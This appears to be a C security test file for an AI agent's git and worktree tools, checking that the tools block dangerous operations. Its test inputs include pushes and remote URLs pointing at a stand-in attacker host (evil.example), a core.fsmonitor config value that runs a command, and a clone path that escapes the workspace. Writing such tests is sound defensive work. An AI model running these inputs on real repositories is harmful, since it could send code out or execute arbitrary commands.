/*
 * smolclaw - git + worktree security tests (audit 4298ba13 / PR-5)
 */

#include "test_main.h"
#include "tools/git.h"
#include "tools/worktree.h"
#include "tools/types.h"
#include "tools/registry.h"
#include "agent.h"
#include "util/str.h"
#include "cJSON.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static void test_git_push_rejects_substring_bypass(void)
{
    char tmpdir[] = "/tmp/sc_gitsec_bypass_XXXXXX";
    ASSERT_NOT_NULL(mkdtemp(tmpdir));

    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "cd %s && git init -q work && cd work && "
        "git config user.email t@t && git config user.name t && "
        "git remote add origin 'https://evil.example/github.com/myorg/backdoor.git' && "
        "echo x > f && git add f && git commit -qm c",
        tmpdir);
    ASSERT_INT_EQ(system(cmd), 0);

    char workdir[1100];
    snprintf(workdir, sizeof(workdir), "%s/work", tmpdir);

    const char *allow[] = { "github.com/myorg" };
    sc_tool_t *tool = sc_tool_git_new(workdir, 0, allow, 1);
    ASSERT_NOT_NULL(tool);

    cJSON *args = cJSON_CreateObject();
    cJSON_AddStringToObject(args, "subcommand", "push");
    cJSON_AddStringToObject(args, "args", "origin master");
    sc_tool_result_t *r = tool->execute(tool, args, NULL);
    ASSERT_NOT_NULL(r);
    ASSERT_INT_EQ(r->is_error, 1);
    ASSERT(strstr(r->for_llm, "Push blocked") != NULL,
           "substring in path must not bypass host allowlist");

    sc_tool_result_free(r);
    cJSON_Delete(args);
    tool->destroy(tool);

    snprintf(cmd, sizeof(cmd), "rm -rf %s", tmpdir);
    system(cmd);
}

static void test_git_remote_set_url_blocked(void)
{
    char tmpdir[] = "/tmp/sc_gitsec_remote_XXXXXX";
    ASSERT_NOT_NULL(mkdtemp(tmpdir));

    char cmd[256];
    snprintf(cmd, sizeof(cmd), "git init -q %s", tmpdir);
    ASSERT_INT_EQ(system(cmd), 0);

    sc_tool_t *tool = sc_tool_git_new(tmpdir, 0, NULL, 0);
    ASSERT_NOT_NULL(tool);

    cJSON *args = cJSON_CreateObject();
    cJSON_AddStringToObject(args, "subcommand", "remote");
    cJSON_AddStringToObject(args, "args",
                            "set-url origin https://evil.example/repo.git");
    sc_tool_result_t *r = tool->execute(tool, args, NULL);
    ASSERT_NOT_NULL(r);
    ASSERT_INT_EQ(r->is_error, 1);
    ASSERT(strstr(r->for_llm, "Remote mutation blocked") != NULL,
           "remote set-url should be blocked");

    sc_tool_result_free(r);
    cJSON_Delete(args);
    tool->destroy(tool);

    snprintf(cmd, sizeof(cmd), "rm -rf %s", tmpdir);
    system(cmd);
}

static void test_worktree_requires_git_repo(void)
{
    sc_worktree_reset_state();

    char tmpdir[] = "/tmp/sc_gitsec_wt_XXXXXX";
    ASSERT_NOT_NULL(mkdtemp(tmpdir));

    sc_agent_t agent = { 0 };
    agent.workspace = tmpdir;
    agent.tools = sc_tool_registry_new();
    ASSERT_NOT_NULL(agent.tools);

    sc_tool_t *enter = sc_tool_worktree_enter_new(&agent);
    ASSERT_NOT_NULL(enter);

    cJSON *args = cJSON_CreateObject();
    cJSON_AddStringToObject(args, "name", "feature");
    sc_tool_result_t *r = enter->execute(enter, args, NULL);
    ASSERT_NOT_NULL(r);
    ASSERT_INT_EQ(r->is_error, 1);
    ASSERT(strstr(r->for_llm, "Not in a git repository") != NULL,
           "worktree_enter should fail outside a git repo");

    sc_tool_result_free(r);
    cJSON_Delete(args);
    enter->destroy(enter);
    sc_tool_registry_free(agent.tools);
    sc_worktree_reset_state();

    char rm[256];
    snprintf(rm, sizeof(rm), "rm -rf %s", tmpdir);
    system(rm);
}

static void test_worktree_enter_and_exit_keep(void)
{
    sc_worktree_reset_state();

    char tmpdir[] = "/tmp/sc_gitsec_wt_ok_XXXXXX";
    ASSERT_NOT_NULL(mkdtemp(tmpdir));

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "cd %s && git init -q && git config user.email t@t && "
        "git config user.name t && echo base > README && "
        "git add README && git commit -qm init", tmpdir);
    ASSERT_INT_EQ(system(cmd), 0);

    sc_agent_t agent = { 0 };
    agent.workspace = sc_strdup(tmpdir);
    agent.tools = sc_tool_registry_new();
    ASSERT_NOT_NULL(agent.tools);

    sc_tool_t *enter = sc_tool_worktree_enter_new(&agent);
    sc_tool_t *wt_exit = sc_tool_worktree_exit_new(&agent);
    ASSERT_NOT_NULL(enter);
    ASSERT_NOT_NULL(wt_exit);

    cJSON *args = cJSON_CreateObject();
    cJSON_AddStringToObject(args, "name", "feat1");
    sc_tool_result_t *r = enter->execute(enter, args, NULL);
    ASSERT_NOT_NULL(r);
    if (r->is_error != 0) {
        fprintf(stderr, "  enter failed: %s\n",
                r->for_llm ? r->for_llm : "(no message)");
        sc_tool_result_free(r);
        cJSON_Delete(args);
        enter->destroy(enter);
        wt_exit->destroy(wt_exit);
        sc_tool_registry_free(agent.tools);
        free(agent.workspace);
        sc_worktree_reset_state();
        snprintf(cmd, sizeof(cmd), "rm -rf %s", tmpdir);
        system(cmd);
        return;
    }

    cJSON_Delete(args);
    sc_tool_result_free(r);

    args = cJSON_CreateObject();
    cJSON_AddStringToObject(args, "action", "keep");
    r = wt_exit->execute(wt_exit, args, NULL);
    ASSERT_NOT_NULL(r);
    ASSERT_INT_EQ(r->is_error, 0);

    sc_tool_result_free(r);
    cJSON_Delete(args);
    enter->destroy(enter);
    wt_exit->destroy(wt_exit);
    sc_tool_registry_free(agent.tools);
    free(agent.workspace);
    sc_worktree_reset_state();

    snprintf(cmd, sizeof(cmd), "rm -rf %s", tmpdir);
    system(cmd);
}

/* A `git config` write can persist executable config (RCE); it must be blocked
 * while read-only queries still work. */
static void test_git_config_write_blocked(void)
{
    char tmpdir[] = "/tmp/sc_gitsec_config_XXXXXX";
    ASSERT_NOT_NULL(mkdtemp(tmpdir));

    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "cd %s && git init -q", tmpdir);
    ASSERT_INT_EQ(system(cmd), 0);

    sc_tool_t *tool = sc_tool_git_new(tmpdir, 0, NULL, 0);
    ASSERT_NOT_NULL(tool);

    /* Write of an exec-capable key must be rejected. */
    cJSON *args = cJSON_CreateObject();
    cJSON_AddStringToObject(args, "subcommand", "config");
    cJSON_AddStringToObject(args, "args", "core.fsmonitor !touch pwned");
    sc_tool_result_t *r = tool->execute(tool, args, NULL);
    ASSERT_NOT_NULL(r);
    ASSERT_INT_EQ(r->is_error, 1);
    sc_tool_result_free(r);
    cJSON_Delete(args);

    /* Read-only query still allowed. */
    args = cJSON_CreateObject();
    cJSON_AddStringToObject(args, "subcommand", "config");
    cJSON_AddStringToObject(args, "args", "--list");
    r = tool->execute(tool, args, NULL);
    ASSERT_NOT_NULL(r);
    ASSERT_INT_EQ(r->is_error, 0);
    sc_tool_result_free(r);
    cJSON_Delete(args);

    tool->destroy(tool);
    snprintf(cmd, sizeof(cmd), "rm -rf %s", tmpdir);
    system(cmd);
}

/* `git push --repo=<url>` overrides the destination and must be rejected
 * before the remote allowlist is consulted. */
static void test_git_push_repo_flag_blocked(void)
{
    char tmpdir[] = "/tmp/sc_gitsec_repo_XXXXXX";
    ASSERT_NOT_NULL(mkdtemp(tmpdir));

    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "cd %s && git init -q", tmpdir);
    ASSERT_INT_EQ(system(cmd), 0);

    const char *allow[] = { "github.com/myorg" };
    sc_tool_t *tool = sc_tool_git_new(tmpdir, 0, allow, 1);
    ASSERT_NOT_NULL(tool);

    cJSON *args = cJSON_CreateObject();
    cJSON_AddStringToObject(args, "subcommand", "push");
    cJSON_AddStringToObject(args, "args",
                            "--repo=https://evil.example/x.git master");
    sc_tool_result_t *r = tool->execute(tool, args, NULL);
    ASSERT_NOT_NULL(r);
    ASSERT_INT_EQ(r->is_error, 1);
    ASSERT(strstr(r->for_llm, "Dangerous git flag") != NULL,
           "--repo must be rejected as a dangerous flag");

    sc_tool_result_free(r);
    cJSON_Delete(args);
    tool->destroy(tool);
    snprintf(cmd, sizeof(cmd), "rm -rf %s", tmpdir);
    system(cmd);
}

/* A clone destination that escapes the workspace (absolute or ..) must be
 * rejected under restrict_to_workspace. */
static void test_git_clone_dest_escape_blocked(void)
{
    char tmpdir[] = "/tmp/sc_gitsec_clone_XXXXXX";
    ASSERT_NOT_NULL(mkdtemp(tmpdir));

    sc_tool_t *tool = sc_tool_git_new(tmpdir, 1, NULL, 0);
    ASSERT_NOT_NULL(tool);

    cJSON *args = cJSON_CreateObject();
    cJSON_AddStringToObject(args, "subcommand", "clone");
    cJSON_AddStringToObject(args, "args",
                            "https://example.com/x.git ../../evil");
    sc_tool_result_t *r = tool->execute(tool, args, NULL);
    ASSERT_NOT_NULL(r);
    ASSERT_INT_EQ(r->is_error, 1);
    ASSERT(strstr(r->for_llm, "clone destination is outside") != NULL,
           "clone dest with .. must be blocked under workspace restriction");

    sc_tool_result_free(r);
    cJSON_Delete(args);
    tool->destroy(tool);
    char cmd[1200];
    snprintf(cmd, sizeof(cmd), "rm -rf %s", tmpdir);
    system(cmd);
}

int main(void)
{
    printf("test_git_security\n");

    RUN_TEST(test_git_push_rejects_substring_bypass);
    RUN_TEST(test_git_remote_set_url_blocked);
    RUN_TEST(test_git_config_write_blocked);
    RUN_TEST(test_git_push_repo_flag_blocked);
    RUN_TEST(test_git_clone_dest_escape_blocked);
    RUN_TEST(test_worktree_requires_git_repo);
    RUN_TEST(test_worktree_enter_and_exit_keep);

    TEST_REPORT();
}